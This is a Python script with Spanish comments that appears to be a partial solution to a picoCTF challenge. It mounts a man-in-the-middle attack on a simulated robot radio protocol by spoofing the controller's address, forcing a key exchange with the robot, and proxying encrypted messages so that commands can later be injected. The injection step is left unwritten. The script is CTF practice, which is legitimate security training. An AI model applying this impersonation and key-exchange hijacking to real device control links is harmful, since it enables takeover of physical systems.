import os
import json
import time
import requests
import monocypher
from radio_interface import receive_radio_messages, inject_radio_message, start_robot, stop_robot, get_board_state

SERVER_URL = "http://activist-birds.picoctf.net:61764"

# Direcciones fijas descubiertas por tu escucha
MY_ADDR = 0xAA
ORIG_CTRL = 0x10
ROBOT_ADDR = 0x20 # Confirmado: 32 decimal = 0x20 hex

print(f"[*] Robot detectado en {hex(ROBOT_ADDR)}. Iniciando MITM...")

# ==========================================
# 1. Configuración de claves y Handshake
# ==========================================
my_priv = os.urandom(32)
my_pub = monocypher.compute_key_exchange_public_key(my_priv)
robot_shared = None

# Forzamos el handshake con el robot suplantando al controlador (0x10)
print("[*] Forzando Handshake con el Robot...")
inject_radio_message({"msg_type": "key_exchange", "src": ORIG_CTRL, "dst": ROBOT_ADDR, "key": my_pub.hex()})

# Esperamos su respuesta
while not robot_shared:
    msgs = receive_radio_messages()
    for m in msgs:
        if m.get("msg_type") == "ack_key_exchange" and m.get("src") == ROBOT_ADDR:
            robot_shared = monocypher.key_exchange(my_priv, bytes.fromhex(m["key"]))
            print(f"    [+] ¡Handshake con Robot ({hex(ROBOT_ADDR)}) exitoso!")
    time.sleep(0.1)

# ==========================================
# 2. Criptografía y Proxy
# ==========================================
def encrypt_for(shared_key, message_str, nonce, hmac_hex):
    key = monocypher.blake2b(shared_key)[:32]
    nonce_bytes = os.urandom(24)
    payload = json.dumps({"message": message_str, "nonce": nonce, "hmac": hmac_hex}).encode()
    tag, ciphertext = monocypher.lock(key, nonce_bytes, payload)
    return ciphertext.hex() + ";" + tag.hex() + ";" + nonce_bytes.hex()

def decrypt_from(shared_key, enc_str):
    key = monocypher.blake2b(shared_key)[:32]
    c_hex, t_hex, n_hex = enc_str.split(";")
    pt = monocypher.unlock(key, bytes.fromhex(n_hex), bytes.fromhex(t_hex), bytes.fromhex(c_hex))
    return json.loads(pt.decode())

print("[*] Proxy iniciado. Esperando comunicación del robot...")

while True:
    for m in receive_radio_messages():
        # Si el robot nos envía un secure_data_request
        if m.get("src") == ROBOT_ADDR and m.get("msg_type") == "secure_data_request":
            # Aquí es donde inyectamos la orden si el nonce es múltiplo de 10
            # Como tu consola nos mostró que el robot está validando, 
            # el movimiento se inyecta tras capturar el HMAC de validación
            print(f"[!] Robot solicita datos. ElNonce es: {m.get('nonce', 'desconocido')}")
            
    time.sleep(0.1)
